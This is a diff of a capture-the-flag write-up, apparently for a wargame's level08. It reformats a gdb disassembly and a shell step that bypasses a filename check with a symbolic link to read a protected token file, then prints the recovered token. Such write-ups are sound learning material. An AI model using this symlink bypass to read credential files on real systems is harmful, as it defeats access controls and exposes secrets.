@@ -163,7 +163,7 @@ Dump of assembler code for function main:
    0x08048515 <+1>:     mov    %esp,%ebp
    0x08048517 <+3>:     and    $0xfffffff0,%esp
    0x0804851a <+6>:     sub    $0x20,%esp
-=> 0x0804851d <+9>:     call   0x80483f0 <getegid@plt>
+   0x0804851d <+9>:     call   0x80483f0 <getegid@plt>
    0x08048522 <+14>:    mov    %eax,0x18(%esp)
    0x08048526 <+18>:    call   0x80483e0 <geteuid@plt>
    0x0804852b <+23>:    mov    %eax,0x1c(%esp)
@@ -238,9 +238,8 @@ int main(int argc, char *argv[]) {
 The program displays the first 1024 characters of the file given as argument, but refuses to read the `token` file. However, the only protection is a `strstr` with `"token"`, so we can easily bypass it with a symbolic link.
 
 ```shell
-ln -s /home/user/level08/token /tmp/link
-./level08 /tmp/link
--> quif5eloekouj29ke0vouxean
+$ ln -s /home/user/level08/token /tmp/link
+$ ./level08 /tmp/link # quif5eloekouj29ke0vouxean
 ```
 
 We lost some time trying to understand why we couldn't connect to `level09` with the token, even trying John the Ripper on it, until we realized we still needed to log to `flag08` and execute `getflag` here.
